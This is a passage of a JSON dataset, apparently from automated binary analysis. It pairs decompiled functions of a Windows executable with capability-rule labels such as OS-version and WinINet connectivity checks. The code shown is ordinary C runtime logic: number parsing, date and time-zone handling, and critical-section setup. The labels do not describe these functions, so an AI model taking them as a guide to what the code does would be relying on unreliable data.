< uVar3) {\n                                uVar12 = uVar13;\n                                uVar13 = uVar3;\n                            }\n                            if (uVar12 <= uVar13) {\n                                uVar14 = uVar12;\n                                *(unaff_EBP + -0x1d4) = (uVar13 - uVar12) + 1;\n                                do {\n                                    *(puVar15 + (uVar14 >> 3)) = *(puVar15 + (uVar14 >> 3)) | '\\x01' << (uVar14 & 7);\n                                    uVar14 = uVar14 + 1;\n                                    piVar1 = unaff_EBP + -0x1d4;\n                                    *piVar1 = *piVar1 + -1;\n                                } while (*piVar1 != 0);\n                            }\n                            uVar13 = 0;\n                        }\n                        else {\n                            *(unaff_EBP + -0x198) = uVar12;\n                            *(puVar15 + (uVar12 >> 3)) = *(puVar15 + (uVar12 >> 3)) | '\\x01' << (uVar12 & 7);\n                            puVar21 = puVar21 + 1;\ncode_r0x00412694:\n                            uVar13 = *(unaff_EBP + -0x198);\n                        }\n                    }\n                    puVar15 = *(unaff_EBP + -0x1b0);\n                    if (*(unaff_EBP + -0x1c0) == 0x7b) {\n                        *(unaff_EBP + 0xc) = puVar21;\n                    }\n                    uVar14 = *(unaff_EBP + -0x1c0);\n                    goto code_r0x004126c0;\n                }\n                goto code_r0x00412535;\n            }\ncode_r0x004122bd:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\ncode_r0x004127e3:\n                piVar1 = unaff_EBP + -0x18c;\n                *piVar1 = *piVar1 + -1;\n                if ((*piVar1 == 0) && (iVar7 != 0)) {\n                    *(unaff_EBP + -0x17d) = 1;\n                }\n                else {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00411f86();\n                    *(unaff_EBP + -0x194) = uVar11;\n                }\n            }\n            else if (uVar11 == 0x2b) goto code_r0x004127e3;\n            if (uVar11 == 0x30) {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.00411f86();\n                *(unaff_EBP + -0x194) = uVar11;\n                if ((uVar11 == 'x') || (uVar11 == 'X')) {\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00411f86();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (*(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -2,  *(unaff_EBP + -0x18c) < 1)) {\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    uVar14 = 0x78;\n                }\n                else {\n                    *(unaff_EBP + -0x19c) = 1;\n                    if (uVar14 == 0x78) {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.00416152(uVar11, uVar9);\n                        }\n                        uVar11 = 0x30;\n                        goto code_r0x0041296d;\n                    }\n                    if (*(unaff_EBP + -0x1b4) != 0) {\n                        piVar1 = unaff_EBP + -0x18c;\n                        *piVar1 = *piVar1 + -1;\n                        if (*piVar1 == 0) {\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                        }\n                    }\n                    uVar14 = 0x6f;\n                }\n            }\n        }\ncode_r0x00412973:\n        if (*(unaff_EBP + -0x1c8) == 0) {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0040fd91(uVar11);\n                        if (iVar7 != 0) {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 4;\n                            iVar7 = fcn.0040fd57(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x00412b50;\n                        }\ncode_r0x00412b4a:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.0040fd57(uVar11);\n                        if (iVar7 == 0) goto code_r0x00412b4a;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x00412b4a;\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) << 3;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) * 10;\n                        }\n                    }\ncode_r0x00412b50:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        *(unaff_EBP + -0x1a0) = *(unaff_EBP + -0x1a0) + -0x30 + uVar11;\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x00412bae;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.00411f86();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.00416152(uVar11, uVar9);\n                        }\n                    }\ncode_r0x00412bae:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                *(unaff_EBP + -0x1a0) = -*(unaff_EBP + -0x1a0);\n            }\n        }\n        else {\n            if (*(unaff_EBP + -0x17d) == '\\0') {\n                do {\n                    if ((uVar14 == 0x78) || (uVar14 == 0x70)) {\n                        iVar7 = fcn.0040fd91(uVar11);\n                        if (iVar7 != 0) {\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 4;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 4 | uVar4 >> 0x1c;\n                            iVar7 = fcn.0040fd57(uVar11);\n                            if (iVar7 == 0) {\n                                uVar11 = (uVar11 & 0xffffffdf) - 7;\n                            }\n                            goto code_r0x00412a3b;\n                        }\ncode_r0x00412a35:\n                        *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                    }\n                    else {\n                        iVar7 = fcn.0040fd57(uVar11);\n                        if (iVar7 == 0) goto code_r0x00412a35;\n                        if (uVar14 == 0x6f) {\n                            if (0x37 < uVar11) goto code_r0x00412a35;\n                            uVar4 = *(unaff_EBP + -0x1ac);\n                            *(unaff_EBP + -0x1ac) = uVar4 << 3;\n                            *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) << 3 | uVar4 >> 0x1d;\n                        }\n                        else {\n                            var_4h_2 = *(unaff_EBP + -0x1ac);\n                            uVar22 = fcn.0040bba0();\n                            *(unaff_EBP + -0x1ac) = uVar22;\n                            *(unaff_EBP + -0x1a8) = uVar22 >> 0x20;\n                        }\n                    }\ncode_r0x00412a3b:\n                    if (*(unaff_EBP + -0x17d) == '\\0') {\n                        *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                        uVar4 = uVar11 - 0x30;\n                        puVar2 = unaff_EBP + -0x1ac;\n                        uVar5 = *puVar2;\n                        *puVar2 = *puVar2 + uVar4;\n                        *(unaff_EBP + -0x1a8) = *(unaff_EBP + -0x1a8) + (uVar4 >> 0x1f) + CARRY4(uVar5, uVar4);\n                        if (*(unaff_EBP + -0x1b4) != 0) {\n                            piVar1 = unaff_EBP + -0x18c;\n                            *piVar1 = *piVar1 + -1;\n                            if (*piVar1 == 0) {\n                                *(unaff_EBP + -0x17d) = 1;\n                                goto code_r0x00412a99;\n                            }\n                        }\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                        uVar11 = fcn.00411f86();\n                    }\n                    else {\n                        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                        if (uVar11 != 0xffffffff) {\n                            fcn.00416152(uVar11, uVar9);\n                        }\n                    }\ncode_r0x00412a99:\n                } while (*(unaff_EBP + -0x17d) == '\\0');\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n            if (*(unaff_EBP + -0x197) != '\\0') {\n                iVar7 = *(unaff_EBP + -0x1ac);\n                *(unaff_EBP + -0x1ac) = -iVar7;\n                *(unaff_EBP + -0x1a8) = -(*(unaff_EBP + -0x1a8) + (iVar7 != 0));\n            }\n        }\n        if (uVar14 == 0x46) {\n            *(unaff_EBP + -0x19c) = 0;\n        }\n        if (*(unaff_EBP + -0x19c) != 0) {\n            if (*(unaff_EBP + -0x18e) == '\\0') {\n                *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n                puVar15 = *(unaff_EBP + -0x1b0);\n                uVar9 = *(unaff_EBP + -0x1a0);\ncode_r0x00412c04:\n                if (*(unaff_EBP + -0x1c8) == 0) {\n                    if (*(unaff_EBP + -0x18d) == '\\0') {\n                        *puVar15 = uVar9;\n                    }\n                    else {\n                        *puVar15 = uVar9;\n                    }\n                }\n                else {\n                    *puVar15 = *(unaff_EBP + -0x1ac);\n                    puVar15[1] = *(unaff_EBP + -0x1a8);\n                }\n            }\n            goto code_r0x00412c30;\n        }\n        goto code_r0x00412cd1;\n    }\n    if (uVar14 == 0x6f) goto code_r0x00412930;\n    if (uVar14 == 99) {\n        if (iVar7 == 0) {\n            *(unaff_EBP + -0x1b4) = 1;\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + 1;\n        }\n        goto code_r0x004124f6;\n    }\n    if (uVar14 == 100) goto code_r0x00412930;\n    if (uVar14 < 0x65) {\ncode_r0x00412535:\n        if (**(unaff_EBP + 0xc) != *(unaff_EBP + -0x194)) goto code_r0x00412543;\n        *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + -1;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + 0x10) = *(unaff_EBP + -0x1dc);\n        }\n    }\n    else {\n        if (0x67 < uVar14) {\n            if (uVar14 == 0x69) {\n                uVar14 = 100;\n                goto code_r0x004122bd;\n            }\n            if (uVar14 != 0x6e) goto code_r0x00412535;\n            uVar9 = *(unaff_EBP + -0x184);\n            if (*(unaff_EBP + -0x18e) != '\\0') goto code_r0x00412c30;\n            goto code_r0x00412c04;\n        }\n        pcVar18 = unaff_EBP + -0x17c;\n        iVar7 = *(unaff_EBP + -0x194);\n        if (iVar7 == 0x2d) {\n            *(unaff_EBP + -0x17c) = 0x2d;\n            pcVar18 = unaff_EBP + -0x17b;\ncode_r0x004122fc:\n            *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar9 = *(unaff_EBP + 8);\n            iVar7 = fcn.00411f86();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        else {\n            if (iVar7 == 0x2b) goto code_r0x004122fc;\n            uVar9 = *(unaff_EBP + 8);\n        }\n        if ((*(unaff_EBP + -0x1b4) == 0) || (0x15d < *(unaff_EBP + -0x18c))) {\n            *(unaff_EBP + -0x18c) = 0x15d;\n        }\n        while( true ) {\n            iVar8 = fcn.0040fd57(iVar7);\n            if ((iVar8 == 0) ||\n               (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0)) break;\n            *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n            *pcVar18 = iVar7;\n            pcVar18 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00411f86();\n            *(unaff_EBP + -0x194) = iVar7;\n        }\n        if ((*0x44e874 == iVar7) &&\n           (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00411f86();\n            *pcVar18 = *0x44e874;\n            while( true ) {\n                pcVar18 = pcVar18 + 1;\n                *(unaff_EBP + -0x194) = iVar7;\n                iVar8 = fcn.0040fd57(iVar7);\n                if ((iVar8 == 0) ||\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 == 0))\n                break;\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar18 = iVar7;\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.00411f86();\n            }\n        }\n        pcVar19 = pcVar18;\n        if ((*(unaff_EBP + -0x19c) != 0) &&\n           (((iVar7 == 0x65 || (iVar7 == 0x45)) &&\n            (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0)))) {\n            *pcVar18 = 'e';\n            pcVar19 = pcVar18 + 1;\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00411f86();\n            *(unaff_EBP + -0x194) = iVar7;\n            if (iVar7 == 0x2d) {\n                *pcVar19 = '-';\n                pcVar19 = pcVar18 + 2;\ncode_r0x00412436:\n                iVar8 = *(unaff_EBP + -0x18c);\n                *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1;\n                if (iVar8 != 0) goto code_r0x00412467;\n                *(unaff_EBP + -0x18c) = 0;\n            }\n            else if (iVar7 == 0x2b) goto code_r0x00412436;\n            while ((iVar8 = fcn.0040fd57(iVar7),  iVar8 != 0 &&\n                   (iVar8 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar8 != 0))) {\n                *(unaff_EBP + -0x19c) = *(unaff_EBP + -0x19c) + 1;\n                *pcVar19 = iVar7;\n                pcVar19 = pcVar19 + 1;\ncode_r0x00412467:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                iVar7 = fcn.00411f86();\n                *(unaff_EBP + -0x194) = iVar7;\n            }\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        if (iVar7 != -1) {\n            fcn.00416152(iVar7, uVar9);\n        }\n        if (*(unaff_EBP + -0x19c) == 0) goto code_r0x00412cd1;\n        if (*(unaff_EBP + -0x18e) == '\\0') {\n            *(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1;\n            *pcVar19 = '\\0';\n            (**0x44e528)(*(unaff_EBP + -0x18d) + -1, *(unaff_EBP + -0x1b0), unaff_EBP + -0x17c);\n        }\n    }\ncode_r0x00412c30:\n    *(unaff_EBP + -0x195) = *(unaff_EBP + -0x195) + '\\x01';\n    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\ncode_r0x00412cb2:\n    if ((*(unaff_EBP + -0x194) == -1) && ((**(unaff_EBP + 0xc) != '%' || ((*(unaff_EBP + 0xc))[1] != 'n'))))\n    goto code_r0x00412cd1;\n    goto code_r0x00411fdf;\ncode_r0x004128cb:\n    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n    if (uVar11 != 0xffffffff) {\n        fcn.00416152(uVar11, *(unaff_EBP + 8));\n    }\ncode_r0x004128e1:\n    if (puVar20 == puVar15) goto code_r0x00412cd1;\n    if ((*(unaff_EBP + -0x18e) == '\\0') &&\n       (*(unaff_EBP + -0x1b8) = *(unaff_EBP + -0x1b8) + 1,  *(unaff_EBP + -0x1c0) != 99)) {\n        if (*(unaff_EBP + -0x196) == '\\0') {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n        else {\n            **(unaff_EBP + -0x1b0) = 0;\n        }\n    }\n    goto code_r0x00412c30;\n}\n",
        "token_count": 10084
    },
    "00412d18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00412d18(int64_t *arg_8h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    iVar5 = *(arg_8h + 4);\n    iVar4 = *arg_8h;\n    iVar8 = *arg_8h;\n    iVar2 = fcn.0040eadd();\n    if (((iVar5 < 0) || (0x1000 < iVar5)) || ((0xfff < iVar5 && (iVar4 != 0)))) {\n        return NULL;\n    }\n    if (*(iVar2 + 0x44) == 0) {\n        iVar3 = fcn.00409f36(0x24);\n        *(iVar2 + 0x44) = iVar3;\n        if (iVar3 != 0) goto code_r0x00412d7e;\n        piVar6 = 0x451368;\n    }\n    else {\ncode_r0x00412d7e:\n        piVar6 = *(iVar2 + 0x44);\n    }\n    iVar4 = fcn.0040d140(iVar4, iVar5, 0x1e13380, 0);\n    var_4h = iVar4 + 0x46;\n    iVar5 = iVar4 + 0x45;\n    iVar7 = fcn.0040bba0(iVar4, iVar4 >> 0x1f, 0xfffffe93, 0xffffffff);\n    iVar7 = fcn.0040bba0(iVar7 - (((iVar4 + 0x171) / 400 - iVar5 / 100) + -0x11 + iVar5 / 4), 0x15180, 0);\n    iVar7 = iVar7 + iVar8;\n    iVar2 = iVar7;\n    if ((iVar7 < 0x100000000) && (iVar7 < 0)) {\n        iVar7 = iVar7 + 0x1e13380;\n        var_4h = iVar5;\n        if (((iVar5 % 4 != 0) || (iVar5 % 100 == 0)) && ((iVar4 + 0x7b1) % 400 != 0)) goto code_r0x00412e7a;\n        iVar7 = CONCAT44((iVar7 >> 0x20) + (0xfffeae7f < iVar7), iVar2 + 0x1e28500);\n    }\n    else if (((var_4h % 4 != 0) || (var_4h % 100 == 0)) && ((iVar4 + 0x7b2) % 400 != 0)) goto code_r0x00412e7a;\n    bVar1 = true;\ncode_r0x00412e7a:\n    piVar6[5] = var_4h;\n    iVar5 = fcn.0040d140(iVar7, 0x15180, 0);\n    piVar6[7] = iVar5;\n    iVar8 = fcn.0040bba0(iVar5, iVar5 >> 0x1f, 0xfffeae80, 0xffffffff);\n    iVar5 = 0x44e748;\n    if (!bVar1) {\n        iVar5 = 0x44e77c;\n    }\n    iVar2 = 1;\n    iVar4 = *(iVar5 + 4);\n    while (iVar4 < piVar6[7]) {\n        iVar2 = iVar2 + 1;\n        iVar4 = *(iVar5 + iVar2 * 4);\n    }\n    piVar6[4] = iVar2 + -1;\n    piVar6[3] = piVar6[7] - *(iVar5 + (iVar2 + -1) * 4);\n    iVar5 = fcn.0040d140(*arg_8h, *(arg_8h + 4), 0x15180, 0);\n    piVar6[6] = (iVar5 + 4) % 7;\n    iVar5 = fcn.0040d140(iVar8 + iVar7, 0xe10, 0);\n    piVar6[2] = iVar5;\n    iVar9 = fcn.0040bba0(iVar5, iVar5 >> 0x1f, 0xfffff1f0, 0xffffffff);\n    iVar9 = iVar8 + iVar7 + iVar9;\n    iVar5 = fcn.0040d140(iVar9, 0x3c, 0);\n    piVar6[1] = iVar5;\n    *piVar6 = iVar9 + iVar5 * -0x3c;\n    piVar6[8] = 0;\n    return piVar6;\n}\n",
        "token_count": 1132
    },
    "00412f3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.00412f3d(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    char *pcVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x444260, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.0040d40a(7);\n    *(unaff_EBP + -4) = 0;\n    uVar3 = *0x451358;\n    *(unaff_EBP + -0x28) = *0x451358;\n    *0x45143c = 0;\n    *0x44e73c = 0xffffffff;\n    *0x44e730 = 0xffffffff;\n    pcVar4 = fcn.004161be(0x44425c);\n    *(unaff_EBP + -0x24) = pcVar4;\n    if ((pcVar4 == NULL) || (*pcVar4 == '\\0')) {\n        if (*0x451440 != 0) {\n            fcn.00409f48(*0x451440);\n            *0x451440 = 0;\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x451390);\n        pcVar2 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar5 != -1) {\n            *0x45143c = 1;\n            *0x44e698 = *0x451390 * 0x3c;\n            if (*0x4513d6 != 0) {\n                *0x44e698 = *0x44e698 + *0x4513e4 * 0x3c;\n            }\n            if ((*0x45142a == 0) || (*0x451438 == 0)) {\n                *0x44e69c = 0;\n                *0x44e6a0 = 0;\n            }\n            else {\n                *0x44e69c = 1;\n                *0x44e6a0 = (*0x451438 - *0x4513e4) * 0x3c;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar3, 0, 0x451394, 0xffffffff, *0x44e728, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x44e728 = 0;\n            }\n            else {\n                (*0x44e728)[0x3f] = 0;\n            }\n            iVar5 = (*pcVar2)(uVar3, 0, 0x4513e8, 0xffffffff, *0x44e72c, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x44e72c = 0;\n            }\n            else {\n                (*0x44e72c)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x451440 != 0) {\n            iVar5 = fcn.0040ef40(pcVar4, *0x451440);\n            if (iVar5 == 0) goto code_r0x00413141;\n            if (*0x451440 != 0) {\n                fcn.00409f48(*0x451440);\n            }\n        }\n        iVar5 = fcn.0040baf0(pcVar4);\n        *0x451440 = fcn.00409f36(iVar5 + 1);\n        if (*0x451440 != 0) {\n            fcn.0040ee40(*0x451440, pcVar4);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00413158();\n            fcn.00414460(*0x44e728, pcVar4, 3);\n            (*0x44e728)[3] = 0;\n            pcVar6 = pcVar4 + 3;\n            if (*pcVar6 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar6 = pcVar4 + 4;\n            }\n            *0x44e698 = fcn.0040b2c4(pcVar6);\n            *0x44e698 = *0x44e698 * 0xe10;\n            for (; (cVar1 = *pcVar6,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar6 = pcVar6 + 1) {\n            }\n            if (*pcVar6 == ':') {\n                pcVar6 = pcVar6 + 1;\n                iVar5 = fcn.0040b2c4(pcVar6);\n                *0x44e698 = *0x44e698 + iVar5 * 0x3c;\n                for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                }\n                if (*pcVar6 == ':') {\n                    pcVar6 = pcVar6 + 1;\n                    iVar5 = fcn.0040b2c4(pcVar6);\n                    *0x44e698 = *0x44e698 + iVar5;\n                    for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x44e698 = -*0x44e698;\n            }\n            *0x44e69c = *pcVar6;\n            if (*0x44e69c == 0) {\n                **0x44e72c = 0;\n            }\n            else {\n                fcn.00414460(*0x44e72c, pcVar6, 3);\n                (*0x44e72c)[3] = 0;\n            }\n            goto code_r0x004131df;\n        }\n    }\ncode_r0x00413141:\n    fcn.0040a0de(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x004131df:\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1620
    },
    "004131e5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.004131e5(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = arg_10h % 4;\n    if (arg_ch == 1) {\n        if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n            iVar4 = *(in_EAX * 4 + 0x44e744);\n        }\n        else {\n            iVar4 = *(in_EAX * 4 + 0x44e778);\n        }\n        iVar5 = iVar4 + 1;\n        iVar3 = (arg_10h * 0x16d + -0x63db + (arg_10h + -1) / 4 + iVar5 + ((arg_10h + 299) / 400 - (arg_10h + -1) / 100)\n                ) % 7;\n        iVar1 = (arg_14h * 7 - iVar3) + arg_18h;\n        if (iVar3 <= arg_18h) {\n            iVar5 = iVar4 + -6;\n        }\n        iVar5 = iVar5 + iVar1;\n        if (arg_14h == 5) {\n            if (((iVar2 == 0) && (arg_10h % 100 != 0)) || ((arg_10h + 0x76c) % 400 == 0)) {\n                iVar1 = *(in_EAX * 4 + 0x44e748);\n            }\n            else {\n                iVar1 = *(in_EAX * 4 + 0x44e77c);\n            }\n            if (iVar1 < iVar5) {\n                iVar5 = iVar5 + -7;\n            }\n        }\n    }\n    else {\n        if (((iVar2 == 0) && (iVar1 = arg_10h / 100,  arg_10h % 100 != 0)) ||\n           (iVar1 = (arg_10h + 0x76c) / 400,  (arg_10h + 0x76c) % 400 == 0)) {\n            iVar5 = *(in_EAX * 4 + 0x44e744);\n        }\n        else {\n            iVar5 = *(in_EAX * 4 + 0x44e778);\n        }\n        iVar5 = iVar5 + arg_1ch;\n    }\n    iVar2 = (in_ECX * 0x3c + arg_20h) * 0x3c;\n    if (arg_8h == 1) {\n        *0x44e738 = (iVar2 + arg_24h) * 1000 + arg_28h;\n        *0x44e730 = arg_10h;\n        *0x44e734 = iVar5;\n    }\n    else {\n        *0x44e744 = (iVar2 + *0x44e6a0 + arg_24h) * 1000 + arg_28h;\n        if (*0x44e744 < 0) {\n            *0x44e744 = *0x44e744 + 86400000;\n            *0x44e740 = iVar5 + -1;\n        }\n        else {\n            iVar1 = 86400000;\n            *0x44e740 = iVar5;\n            if (86399999 < *0x44e744) {\n                *0x44e744 = *0x44e744 + -86400000;\n                *0x44e740 = iVar5 + 1;\n            }\n        }\n        *0x44e73c = arg_10h;\n    }\n    return iVar1;\n}\n",
        "token_count": 942
    },
    "004136ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004136ad(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4442b8, 0x10);\n    if (*0x451448 == NULL) {\n        if (*0x45101c != 1) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n            if (iVar2 != 0) {\n                *0x451448 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"InitializeCriticalSectionAndSpinCount\");\n                if (*0x451448 != NULL) goto code_r0x004136f9;\n            }\n        }\n        *0x451448 = 0x41369d;\n    }\ncode_r0x004136f9:\n    pcVar1 = *0x451448;\n    *(unaff_EBP + -4) = 0;\n    uVar3 = (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    *(unaff_EBP + -0x20) = uVar3;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 334
    },
    "00413d55": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
